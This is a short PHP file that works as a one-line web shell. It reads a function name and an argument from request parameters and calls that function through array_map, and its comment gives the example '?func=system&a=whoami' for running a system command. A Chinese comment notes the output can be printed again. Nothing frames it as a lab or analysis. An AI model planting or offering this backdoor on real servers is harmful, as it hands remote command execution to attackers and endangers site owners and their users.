<?php
//?func=system&a=whoami
$func=$_REQUEST['func'];
$a=$_REQUEST['a'];
$array[0]=$a;
$new_array = array_map($func,$array);
//print_r($new_array); 这里可以再打印一次
?>